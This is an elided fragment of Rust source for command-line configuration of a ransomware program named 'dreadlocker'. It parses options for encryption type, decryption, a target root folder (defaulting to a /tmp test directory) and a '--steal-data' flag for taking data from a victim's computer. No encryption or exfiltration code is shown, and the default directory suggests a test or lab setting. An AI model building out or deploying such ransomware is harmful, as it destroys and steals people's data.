...
pub struct Config {
    // Will contain the required configuration for the ransomware to work
...
impl Config {
    pub fn new(args: Vec<String>) -> Result<Config, &'static str> {
        ...
        let test_dir: String = String::from("/tmp/dreadlocker_folder");
        let directory;
        ...
        if let Some(i) = iterable_args
            .clone()
            .position(|x| x.trim().to_lowercase() == "--encryption-type")
        {
        ...
        if let Some(_) = iterable_args
            .clone()
            .position(|x| x.trim().to_lowercase() == "--decrypt")
        {
            decryption_val = true;
        }
        // handling the param --root-folder
        if let Some(j) = iterable_args
            .clone()
            .position(|x| x.trim().to_lowercase() == "--root-folder")
        {
            directory = args
                .get(j + 1)
                .unwrap_or_else(|| {
                    println!("Encryption directory not found. Defaulting to the tmp directory.");
                    create_dir("/tmp/dreadlocker_folder").unwrap_or_else(|_| {
                        println!("Error creating the tmp directory. It must already exist.");
                    });
                    &test_dir
                })
                .to_string();
        } else {
            println!("'--root-folder' parameter not found. Defaulting to the tmp directory");
            create_dir("/tmp/dreadlocker_folder").unwrap_or_else(|_| {
                println!("Error creating the tmp directory. It must already exist.");
            });
            directory = test_dir;
        ...
        if let Some(_) = iterable_args
            .clone()
            .position(|x| x.trim().to_lowercase() == "--steal-data")
        {
            println!("'--steal-data' parameter found. This will cause the ransomware to steal data from the victim's computer.");
            steal_val = true;
        }
        Ok(Config {
